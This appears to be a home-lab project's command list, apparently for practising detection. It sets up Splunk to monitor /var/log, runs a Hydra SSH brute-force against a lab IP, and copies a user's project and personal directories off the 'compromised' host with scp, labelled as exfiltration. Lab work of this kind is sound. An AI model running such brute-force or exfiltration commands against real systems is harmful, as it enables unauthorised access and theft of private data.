
# Commands Used in the Project
### 1. Network Interface Activation

      ifup ens33

Purpose: Activates the network interface named "ens33" and initiates the process of obtaining an IP address through DHCP or static configuration.

2. Splunk Enterprise Download
bash
Copy code
wget -O splunk-9.2.1-78803f08aabb-Linux-x86_64.tgz 'download_link'
Purpose: Downloads the Splunk Enterprise installation package from the Splunk website.

3. Extracting Splunk Package
bash
Copy code
tar -xvzf splunk-9.2.1-78803f08aabb-Linux-x86_64.tgz -C /opt
Purpose: Extracts the downloaded Splunk package into the /opt directory.

4. Starting Splunk
bash
Copy code
/opt/splunk/bin/splunk start --accept-license
Purpose: Starts Splunk Enterprise and accepts the license agreement.

5. Adding Splunk Monitor
bash
Copy code
/opt/splunk/bin/splunk add monitor /var/log
Purpose: Adds the /var/log directory to the Splunk real-time monitoring system.

6. Hydra Brute Force Attack
bash
Copy code
hydra -L username.txt -P password.txt -f ssh://192.168.80.161
Purpose: Uses Hydra to perform a brute force attack against the SSH service of the target machine.

7. SCP Command for Data Exfiltration
bash
Copy code
scp -r lunar@192.168.80.161:/home/lunar/Client_Projects /local/destination
scp -r lunar@192.168.80.161:/home/lunar/Personal_Doc /local/destination
Purpose: Downloads sensitive directories from the compromised machine to the local system using SCP.

Command Titles and Their Purposes
Network Interface Activation

bash
Copy code
ifup ens33
Purpose: To activate the network interface and obtain an IP address.

Downloading Splunk Enterprise

bash
Copy code
wget -O splunk-9.2.1-78803f08aabb-Linux-x86_64.tgz 'download_link'
Purpose: To download the Splunk Enterprise installation package.

Extracting Splunk Package

bash
Copy code
tar -xvzf splunk-9.2.1-78803f08aabb-Linux-x86_64.tgz -C /opt
Purpose: To extract the downloaded Splunk package.

Starting Splunk Enterprise

bash
Copy code
/opt/splunk/bin/splunk start --accept-license
Purpose: To start Splunk Enterprise and accept the license agreement.

Adding Directory to Splunk Monitor

bash
Copy code
/opt/splunk/bin/splunk add monitor /var/log
Purpose: To add the /var/log directory to the Splunk monitoring system.

Performing Brute Force Attack with Hydra

bash
Copy code
hydra -L username.txt -P password.txt -f ssh://192.168.80.161
Purpose: To perform a brute force attack against the SSH service of the target machine.

Data Exfiltration Using SCP

bash
Copy code
scp -r lunar@192.168.80.161:/home/lunar/Client_Projects /local/destination
scp -r lunar@192.168.80.161:/home/lunar/Personal_Doc /local/destination
Purpose: To download sensitive directories from the compromised machine to the local system.

You can format and upload this list to your GitHub repository as a markdown file to showcase your command-line expertise and project workflow.
